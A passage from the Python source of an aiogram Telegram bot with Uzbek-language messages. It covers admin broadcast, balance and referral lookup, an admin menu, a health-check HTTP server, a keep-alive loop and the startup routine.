                text += f"📅 Vaqt: {w['created_at']}\n"
                text += "➖➖➖➖➖➖➖\n"
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer("📭 Yechish so'rovlari yo'q")
    except Exception as e:
        logger.error(f"❌ Xatolik: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 15. BARCHAGA XABAR =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
async def broadcast_start(message: types.Message):
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer("📨 Xabar matnini yozing:")

@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def broadcast_send(message: types.Message):
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    conn = None
    try:
        conn = await get_db()
        users = await conn.fetch("SELECT telegram_id FROM users")
        
        sent = 0
        for user in users:
            try:
                await bot.send_message(user['telegram_id'], f"📨 {text}")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                logger.error(f"❌ Xabar yuborishda xatolik: {e}")
                pass
        
        await message.answer(f"✅ Yuborildi: {sent} ta foydalanuvchiga", reply_markup=admin_menu)
    except Exception as e:
        logger.error(f"❌ Broadcast xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 16. BALANS KOMANDASI =================
@dp.message(Command("balance"))
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    
    conn = None
    try:
        conn = await get_db()
        user = await conn.fetchrow(
            "SELECT balance, phone, COALESCE(referal_count, 0) as referal_count FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        
        if not user:
            await message.answer("❌ Ro'yxatdan o'tmagansiz. /start")
            return
        
        if user['phone'] == "no_phone_yet":
            await message.answer(
                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
                reply_markup=user_menu
            )
            return
        
        await message.answer(
            f"💰 Balans: {user['balance']:,} so'm\n"
            f"👥 Referallar: {user['referal_count']}/5",
            reply_markup=user_menu
        )
    except Exception as e:
        logger.error(f"❌ Balans xatosi: {e}")
    finally:
        if conn:
            await conn.close()

# ================= 17. ADMIN MENU QAYTARISH =================
@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer(
            "👋 Admin panel",
            reply_markup=admin_menu
        )

# ================= HTTP SERVER =================
async def health_check(request):
    return web.Response(text="Bot is running!")

async def start_http_server():
    try:
        app = web.Application()
        app.router.add_get('/', health_check)
        app.router.add_get('/health', health_check)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', PORT)
        await site.start()
        logger.info(f"🌐 HTTP server port {PORT} da ishga tushdi")
        
        while True:
            await asyncio.sleep(3600)
    except Exception as e:
        logger.error(f"❌ HTTP server xatosi: {e}")

# ================= KEEP-ALIVE =================
async def keep_alive():
    while True:
        try:
            await bot.get_me()
            logger.info("📡 Ping yuborildi")
        except Exception as e:
            logger.error(f"❌ Ping xatosi: {e}")
        await asyncio.sleep(60)

# ================= MAIN =================
async def main():
    logger.info("🤖 Bot ishga tushmoqda...")
    
    # Database init
    await init_db()
    
    # Database migratsiya
    await migrate_db()
    
    # HTTP server
    asyncio.create_task(start_http_server())
    
    # Keep-alive
    asyncio.create_task(keep_alive())
    
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logger.info("✅ Webhook o'chirildi")
    except Exception as e:
        logger.error(f"❌ Webhook ni o'chirishda xatolik: {e}")
    
    await dp.start_polling(
        bot, 
        skip_updates=True,
        allowed_updates=["message", "callback_query"]
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("🛑 Bot to'xtatildi!")
    except Exception as e:
        logger.error(f"❌ Bot ishdan chiqdi: {e}")
